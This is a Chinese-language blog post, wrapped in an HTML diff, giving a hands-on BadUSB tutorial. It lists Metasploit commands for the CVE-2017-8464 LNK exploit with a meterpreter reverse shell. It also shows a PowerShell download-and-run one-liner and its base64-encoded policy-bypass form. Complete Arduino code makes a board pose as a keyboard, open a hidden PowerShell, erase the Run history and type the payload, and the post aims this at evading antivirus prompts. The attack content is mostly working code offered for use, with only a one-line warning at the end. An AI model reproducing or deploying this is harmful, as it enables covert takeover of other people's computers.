@@ -1,0 +1,283 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    
+<meta charset="utf-8" >
+
+<title>简易BadUSB制作和玩法 | Mari0er&#39;s Blog</title>
+<meta name="description" content="">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://mari0er.top/favicon.ico?v=1768205765236">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://mari0er.top/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+      <div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="https://mari0er.top">
+        <img class="avatar" src="https://mari0er.top/images/avatar.png?v=1768205765236" alt="" width="32px" height="32px">
+      </a>
+      <a href="https://mari0er.top">
+        <h1 class="site-title">Mari0er&#39;s Blog</h1>
+      </a>
+    </div>
+    <div class="right">
+      <transition name="fade">
+        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
+      </transition>
+    </div>
+  </div>
+</div>
+
+<transition name="fade">
+  <div class="menu-container" style="display: none;" v-show="menuVisible">
+    <div class="menu-list">
+      
+        
+          <a href="/" class="menu purple-link">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="menu purple-link">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="menu purple-link">
+            标签
+          </a>
+        
+      
+        
+          <a href="https://mari0er.top/post/about.html" class="menu purple-link">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+</transition>
+
+
+      <div class="content-container">
+        <div class="post-detail">
+          
+            <div class="feature-container" style="background-image: url('https://tuchuang.looklook.workers.dev/0505/0602.png')">
+            </div>
+          
+          <h2 class="post-title">简易BadUSB制作和玩法</h2>
+          <div class="post-info post-detail-info">
+            <span><i class="icon-calendar-outline"></i> 2018-03-07</span>
+            
+              <span>
+                <i class="icon-pricetags-outline"></i>
+                
+                  <a href="https://mari0er.top/tag/badusb/">
+                    BadUSB
+                    
+                      ，
+                    
+                  </a>
+                
+                  <a href="https://mari0er.top/tag/tennsy/">
+                    Tennsy
+                    
+                      ，
+                    
+                  </a>
+                
+                  <a href="https://mari0er.top/tag/arduino/">
+                    Arduino
+                    
+                  </a>
+                
+              </span>
+            
+          </div>
+          <div class="post-content">
+            <p>  BadUSB是前几年的热门话题，该漏洞由Karsten Nohl和Jakob Lell共同发现，于2014年在BlackHat安全大会上公布。之后研究它的人很多，网上的教程也有很多，最近自己研究了一下并通过一些小技巧解决了黑框和杀软弹窗的问题。</p>
+<!-- more -->
+<h2 id="0x01">0x01</h2>
+<p>  首先，我们来玩一个简单的“BadUSB”玩法。该方法利用CVE-2017-8464漏洞，影响版本包括常用的Win7，Win8，Win10等。制作过程很简单，一个U盘和一个最新版本的Kali系统即可，最新版的Kali系统请点击<a href="https://www.kali.org/downloads/">这里</a>下载。下面介绍具体制作方法，打开Kali，输入代码如下，执行后会生成一个cpl文件和许多带盘符的快捷方式文件</p>
+<pre><code>root@kali:~# msfconsole
+msf &gt; use exploit/windows/fileformat/cve_2017_8464_lnk_rce
+msf exploit(cve_2017_8464_lnk_rce) &gt; set payload windows/x64/meterpreter/reverse_tcp
+msf exploit(cve_2017_8464_lnk_rce) &gt; set lhost 192.168.10.18
+msf exploit(cve_2017_8464_lnk_rce) &gt; set lport 4444
+msf exploit(cve_2017_8464_lnk_rce) &gt; exploit
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://tuchuang.looklook.workers.dev/0606/0601.png" alt="" loading="lazy"></figure>
+<h2 id="0x02">0x02</h2>
+<p>  生成完文件之后，利用handler模块监听回连的meterpreter。接下来，如果你的U盘插入电脑显示是<strong>F盘</strong>就将带F盘符的快捷方式文件和cpl文件一起放入U盘的根目录(建议多放几个快捷方式文件，说不定有的人电脑都到J盘了)，然后插入电脑就可以触发漏洞并回弹shell。这种方法严格上不能叫做BadUSB,因为这只是简单的利用了Windows的漏洞，生成的文件容易被杀软查杀。</p>
+<pre><code>msf exploit(cve_2017_8464_lnk_rce) &gt; use exploit/multi/handler
+msf exploit(handler) &gt; set payload windows/x64/meterpreter/reverse_tcp
+msf exploit(handler) &gt; set lhost 192.168.10.18
+msf exploit(handler) &gt; set lport 4444
+msf exploit(handler) &gt; run
+[*] Exploit running as background job 0.
+[*] Started reverse TCP handler on 192.168.10.18:4444 
+</code></pre>
+<p><strong>注意：</strong> 1.Kali地址--192.168.10.18<br>
+　　　 2.电脑打开自动播放功能可以直接回弹shell，否则需要手动打开U盘才能够回弹</p>
+<h2 id="0x03">0x03</h2>
+<p>  那什么才是真正的BadUSB呢？我的理解是：利用一个类似U盘的东西插入电脑，U盘将自动模拟成键盘并输入定义好的代码以完成攻击，能完美绕过所有的杀软，因为这属于硬件的入侵，具体的分析和原理请点击<a href="http://www.freebuf.com/articles/terminal/131193.html">这里</a>查看详细说明文章。文章里详细记录了利用Arduino开发板模仿TEENSY的过程，这里我就不重复说明制作过程了，主要来说说如何解决黑框和弹窗的问题。<br>
+<img src="https://tuchuang.looklook.workers.dev/0505/0602.png" alt="" loading="lazy"><br>
+上图是我直接在某电商平台买的Arduino开发板成品，基本上可以完美伪装成U盘。下面利用BadUSB获得shell为例子，来实战一番。</p>
+<h2 id="0x04">0x04</h2>
+<p>  首先，利用msf生成基于psh的payload。直接将生成的代码输入目标电脑的cmd终端会获得shell，但是在有360存在的情况下，会弹窗提示用户是否运行powershell，阻断代码的执行。此时心想如果目标用户自愿手动打开一个powershell终端，然后输入命令应该不会弹窗了吧？</p>
+<pre><code>root@kali:~# msfconsole
+msf &gt; use exploit/multi/script/web_delivery 
+msf exploit(multi/script/web_delivery) &gt; set target 2
+target =&gt; 2
+msf exploit(multi/script/web_delivery) &gt; set payload windows/x64/meterpreter/reverse_tcp
+payload =&gt; windows/x64/meterpreter/reverse_tcp
+msf exploit(multi/script/web_delivery) &gt; set srvhost 192.168.10.18 
+srvhost =&gt; 192.168.10.18
+msf exploit(multi/script/web_delivery) &gt; set srvport 80
+srvport =&gt; 80
+smsf exploit(multi/script/web_delivery) &gt; set uripath /
+uripath =&gt; /
+msf exploit(multi/script/web_delivery) &gt; set lhost 192.168.10.18 
+lhost =&gt; 192.168.10.18
+msf exploit(multi/script/web_delivery) &gt; set lport 4444
+lport =&gt; 4444
+msf exploit(multi/script/web_delivery) &gt; exploit -z -j
+[*] Exploit running as background job 0.
+[*] Started reverse TCP handler on 192.168.10.18:4444 
+[*] Using URL: http://192.168.10.18:80/
+[*] Server started.
+[*] Run the following command on the target machine:
+powershell.exe -nop -w hidden -c $q=new-object net.webclient;$q.proxy=[Net.WebRequest]::GetSystemWebProxy();$q.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $q.downloadstring('http://192.168.10.18/');
+msf exploit(multi/script/web_delivery) &gt; 
+</code></pre>
+<p>  手工实验，直接打开powershell可以绕过弹窗获得shell，但是需要修改命令为base64的格式。修改后的payload代码如下</p>
+<pre><code>powershell -w hidden -ep bypass -enc JABxAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwAKACQAcQAuAHAAcgBvAHgAeQA9AFsATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEcAZQB0AFMAeQBzAHQAZQBtAFcAZQBiAFAAcgBvAHgAeQAoACkAOwAkAHEALgBQAHIAbwB4AHkALgBDAHIAZQBkAGUAbgB0AGkAYQBsAHMAPQBbAE4AZQB0AC4AQwByAGUAZABlAG4AdABpAGEAbABDAGEAYwBoAGUAXQA6ADoARABlAGYAYQB1AGwAdABDAHIAZQBkAGUAbgB0AGkAYQBsAHMAOwBJAEUAWAAgACQAcQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQA4AC8AJwApADsACgA=
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://tuchuang.looklook.workers.dev/0606/0603.png" alt="" loading="lazy"></figure>
+<h2 id="0x05">0x05</h2>
+<p>  接下来就是最重要的一步了，如何让USB模拟键盘输入上述指定的payload？利用Arduino开发板编译指定的代码即可实现，代码编写很简单，基本上只需要如下几行命令。相信大家也都看得懂了，只要在括号里填入想要输入的代码即可。</p>
+<blockquote>
+<p>include&lt;Keyboard.h&gt;     //包含键盘模块的头文件<br>
+Keyboard.begin();        //开启键盘通信<br>
+Keyboard.press();        //按下某个键<br>
+Keyboard.release();      //释放某个键<br>
+Keyboard.println();      //输入指定内容<br>
+Keyboard.end();          //结束键盘通信</p>
+</blockquote>
+<p>如何打开powershell终端？之前的文章是通过修改终端的大小来达到“隐藏”的效果，经过测试发现可以直接通过命令打开一个隐藏的终端，达到真正的隐藏效果。完整的代码如下：</p>
+<pre><code>#include &lt;Keyboard.h&gt;             //包含键盘模块的头文件
+void setup() {
+Keyboard.begin();                 //开始键盘通信
+delay(3000);                      //延时3000毫秒开始输入命令，不要太短，因为每台电脑识别开发板速度不一样 
+
+Keyboard.press(KEY_LEFT_GUI);     //按下win键  
+Keyboard.press('r');              //按下r键 
+Keyboard.release('r');            //松掉r键
+Keyboard.release(KEY_LEFT_GUI);   //松掉win键    打开运行菜单
+delay(500); 
+
+Keyboard.println(&quot;cmd /c start powershell -w hidden&quot;);  //进入一个隐藏的powershell窗口 
+Keyboard.press(KEY_RETURN);       //按下回车键
+Keyboard.release(KEY_RETURN);     //松掉回车键
+delay(500);
+
+Keyboard.println(&quot;reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /f;&quot;);      //清除运行框的命令记录
+Keyboard.press(KEY_RETURN);       
+Keyboard.release(KEY_RETURN);     
+delay(500);
+
+Keyboard.println(&quot;powershell -w hidden -ep bypass -enc JABxAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4Adw...........&quot;);
+Keyboard.press(KEY_RETURN);       
+Keyboard.release(KEY_RETURN);     
+delay(500);                      //输入指定的payload
+
+Keyboard.end();                  //结束键盘通讯 
+}
+
+void loop() {
+  // put your main code here, to run repeatedly:
+}
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://tuchuang.looklook.workers.dev/0606/0604.png" alt="" loading="lazy"></figure>
+<p>编译，上传时记得选择开发板类型和端口,上传完成后开发板会自动断开Arduino并连接电脑，记得及时拔掉开发板，不然会在主机上输入上述payload。此时打开隐藏终端时还是会有蓝框闪过，但是时间很短，从插上开发板到完成攻击大概只需要2秒钟。完整效果演示如下<br>
+<img src="https://tuchuang.looklook.workers.dev/0606/BadUSB.gif" alt="" loading="lazy"></p>
+<h2 id="0x06">0x06</h2>
+<p>  上述代码只是简单的利用msf获得shell，还有很多其他的玩法，比如<a href="http://www.freebuf.com/articles/100026.html">这篇文章</a>利用BadUSB窃取指定文件,还有<a href="http://www.freebuf.com/articles/terminal/6182.html">这篇文章</a>利用set工具集进行渗透。总之，通过自定义的payload还可以完成更多自己想要的操作。所以，对于来历不明的USB千万不要轻易插到自己的电脑上，如果必要可以插到自己的虚拟机进行读取操作。</p>
+<blockquote>
+<p>作者： Mari0er<br>
+链接： https://mari0er.top/post/badusb.html<br>
+版权： 本博客所有文章除特别声明外，均采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！！</p>
+</blockquote>
+
+          </div>
+        </div>
+
+        
+          <div class="next-post">
+            <a class="purple-link" href="https://mari0er.top/post/usb.html/">
+              <h3 class="post-title">
+                下一篇：利用U盘绕过电脑开机密码
+              </h3>
+            </a>
+          </div>
+          
+      </div>
+
+      
+
+      <div class="site-footer">
+  <div class="slogan"></div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+  待人友善是修养 独来独往是性格 | <a class="rss" href="https://mari0er.top/atom.xml" target="_blank">RSS</a>
+</div>
+
+
+    </div>
+    <script type="application/javascript">
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
